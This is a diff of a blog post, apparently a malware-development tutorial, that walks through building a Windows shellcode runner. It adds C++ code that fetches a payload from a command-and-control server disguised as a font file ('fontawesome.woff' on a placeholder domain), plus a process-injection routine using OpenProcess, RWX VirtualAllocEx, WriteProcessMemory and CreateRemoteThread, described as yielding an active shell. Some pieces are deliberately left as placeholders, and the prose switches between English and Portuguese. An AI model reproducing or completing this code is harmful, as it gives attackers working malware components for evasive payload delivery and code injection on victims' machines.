@@ -11,9 +11,10 @@ Hey everyone,
 
 I want to start this post by making one thing very clear: I’m not going to show how to build a fully functional shellcode runner. The goal here is to walk you through the methods I used to create mine, along with a few C++ examples demonstrating how to apply these techniques.
 
+
 ## System Call Obfuscation
 
-System Call Obfuscation, also known as D/Invoke in C#, is a method that can be widely used to call Windows functions at runtime.
+System Call Obfuscation, also known as D/Invoke in C#, is a method that can be widely used to call Windows functions at runtime, ele é um metodo que pode ser implementado em qualquer fase do malware que utilize alguma função do Windows.
 
 Abaixo, um exemplo dessa técnica aplicada a função "CreateToolhelp32Snapshot", usada principalmente na técnica de Process Injection
 
@@ -111,6 +112,95 @@ Once the target process is identified, the corresponding Process ID (PID) is ext
 
 ## Request for Shellcode
 
-```cpp
 
+```cpp
+#include <windows.h>
+#include <wininet.h>
+#include <cstdio>
+
+BOOL Request(BYTE** outPayload, DWORD* outPayloadSize) {
+    HINTERNET hInternet = InternetOpen(
+        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
+        INTERNET_OPEN_TYPE_PRECONFIG,
+        NULL,
+        NULL,
+        0
+    );
+
+    if (!hInternet) {
+        return FALSE;
+    }
+
+    HINTERNET hFile = InternetOpenUrl(
+        hInternet,
+        L"https://domain.com:8443/fontawesome.woff",
+        NULL,
+        0,
+        INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE,
+        0
+    );
+
+    if (!hFile) {
+        InternetCloseHandle(hInternet);
+        return FALSE;
+    }
+}
 ```
+### What this is doing
+
+Once a remote resource is successfully opened, data must be read from the network stream. This is typically done using `InternetReadFile`, which operates in a stream-oriented manner and may return partial data on each call. Because of this behavior, the function is usually invoked repeatedly until no more bytes are available. If this logic is implemented correctly within your own codebase, it allows the application to successfully retrieve data from a remote command-and-control Server.
+
+## Write and Execute!
+
+At this stage, you already have the PID of the target process and the payload retrieved from the C2 server in memory. This concludes the preparation phase of the malware, as the next step is where the actual injection takes place. In the following phase, the payload is injected into the target process and executed, ultimately resulting in an active shell.
+
+`C++`
+```cpp
+void ExecuteRemoteProcessExample(DWORD targetPid) {
+
+    // 1. Obtain a handle to the target process
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
+
+    // 2. Allocate memory inside the remote process
+    // (In a real scenario, this would reserve executable memory)
+    LPVOID remoteBuffer = VirtualAllocEx(
+        hProcess,
+        NULL,
+        /* payload size */,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+
+    // 3. Example payload (illustrative only)
+    // This does NOT represent real shellcode
+    BYTE examplePayload[] = { 0x90, 0x90, 0x90, 0xCC };
+
+    // 4. Write data into the remote process memory
+    // Actual memory copying logic is intentionally omitted
+    WriteProcessMemory(
+        hProcess,
+        remoteBuffer,
+        /* payload buffer */,
+        /* payload size */,
+        NULL
+    );
+
+    // 5. Create a remote thread in a suspended state
+    HANDLE hThread = CreateRemoteThread(
+        hProcess,
+        NULL,
+        0,
+        /* entry point */,
+        NULL,
+        CREATE_SUSPENDED,
+        NULL
+    );
+
+    // 6. Resume execution
+    ResumeThread(hThread);
+}
+```
+
+### What this is doing
+
+The execution phase consists of opening a handle to the target process, allocating memory within its address space, and writing a payload into that memory region. Once the payload is placed, a remote thread is created to transfer execution flow to the injected code. While the APIs involved are publicly documented Windows functions, their correct and safe implementation requires careful memory management, synchronization, and error handling. For this reason, implementation details are intentionally abstracted in this article.
